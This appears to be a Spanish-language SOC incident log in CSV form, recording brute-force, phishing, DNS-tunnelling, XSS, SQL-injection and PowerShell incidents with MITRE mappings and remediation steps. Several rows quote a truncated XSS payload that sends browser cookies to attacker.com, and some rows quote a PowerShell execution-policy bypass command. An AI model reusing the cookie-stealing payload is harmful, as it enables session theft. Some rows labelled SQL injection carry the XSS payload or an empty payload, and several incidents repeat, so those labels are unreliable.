ID_Incidente,Fecha_Hora,Titulo_Incidente,Tipo_Amenaza,Severidad,Estado,Tactica_MITRE,Tecnica_MITRE,IP_Origen,IP_Destino_Activo,Usuario_Involucrado,MTTD_Minutos,MTTR_Minutos,Descripcion_Hallazgo,Accion_Correctiva,Responsable_SOC
INC-2026-001,2026-09-08 08:14:22,Multiples intentos fallidos de autenticacion SSH,Fuerza Bruta,Alta,Cerrado,Credential Access,T1110 - Brute Force,185.220.101.5,ACT-002 (10.0.1.15),admin_backup,5,25,Bloqueo automatico de IP via Fail2ban y notificacion,IP agregada a lista negra de firewall perimetral,Analista L1
INC-2026-002,2026-09-09 11:30:00,Deteccion de correo de suplantacion de identidad (Phishing),Ingenieria Social,Media,Cerrado,Initial Access,T1566 - Phishing,198.51.100.44,ACT-004 (Workstation 12),carlos.m@empresa.com,12,45,Usuario reporto correo sospechoso con enlace apocrifo de nomina,Purga de buzones y capacitacion de concientizacion,Analista L2
INC-2026-003,2026-09-10 19:45:10,Escaneo masivo de puertos TCP SYN,Reconocimiento,Baja,Cerrado,Reconnaissance,T1046 - Network Service Scanning,45.154.255.89,ACT-005 (Perimetro),N/A,2,10,"Sondeo de puertos 80, 443, 3389, 8080 en gateway perimetral",Reglas perimetrales de drop silencioso activadas,Analista L1
INC-2026-004,2026-09-11 03:22:05,Ejecucion de script PowerShell sospechoso en endpoint,Malware / Execution,Critica,En Mitigacion,Execution,T1059.001 - PowerShell,Localhost,ACT-004 (Workstation 05),maria.l@empresa.com,3,60,EDR detecto llamada a script codificado en Base64 descargando payload,"Endpoint aislado de la red, recoleccion de memoria RAM forense",Analista L3 / Lead
INC-2026-005,2026-09-12 14:05:50,Intento de acceso a recurso confidencial fuera de horario,Acceso No Autorizado,Media,Cerrado,Defense Evasion,T1078 - Valid Accounts,200.89.45.12,ACT-001 (PostgreSQL),juan.p@empresa.com,8,30,Intento de lectura de tabla de salarios desde IP no corporativa,"Sesion revocada, reseteo preventivo de credenciales",Analista L2
INC-2026-006,2026-09-13 09:12:11,Exfiltracion potencial de datos via DNS tunneling,Fuga de Informacion,Critica,En Investigacion,Exfiltration,T1048 - Exfiltration Over Alternative Protocol,10.0.3.40,ACT-006 (Cloud Storage),svc_storage,4,0,Trafico anomalo de consultas DNS TXT de alta frecuencia a dominio no categorizado,Bloqueo en servidor DNS resolver y contencion del host,Analista L3 / Lead
INC-2026-007,2026-09-13 16:50:33,Ataque de Cross-Site Scripting (XSS) en portal web,Vulnerabilidad Web,Media,Cerrado,Initial Access,T1190 - Exploit Public-Facing App,103.22.182.19,ACT-002 (Web ERP),anon_client,1,15,Payload <script> detectado y mitigado en WAF,Regla de WAF ajustada y parche de sanitizacion desplegado,Analista L1
INC-2026-008,2026-09-14 02:40:19,Modificacion no autorizada de archivo critico de sistema,Integridad / Manipulacion,Alta,Abierto,Persistence,T1505 - Server Software Component,Localhost,ACT-002 (Web ERP),root_session,2,0,FIM (File Integrity Monitoring) reporto cambio en /etc/pam.d/sshd,Servidor colocado en cuarentena y rollback de snapshot,Analista L2
INC-2026-009,2026-09-14 17:02:17,Ataque de Fuerza Bruta detectado desde 185.220.101.5,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,185.220.101.5,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 185.220.101.5 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-010,2026-09-14 17:02:17,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-011,2026-09-14 17:02:17,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-012,2026-09-14 17:02:17,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-013,2026-09-14 17:02:17,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-014,2026-09-14 17:35:38,Ataque de Fuerza Bruta detectado desde 45.154.255.89,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,45.154.255.89,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 45.154.255.89 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-015,2026-09-14 17:35:38,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,103.22.182.19,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-016,2026-09-14 17:35:38,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,103.22.182.19,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-017,2026-09-14 17:35:38,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-018,2026-09-14 17:35:38,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
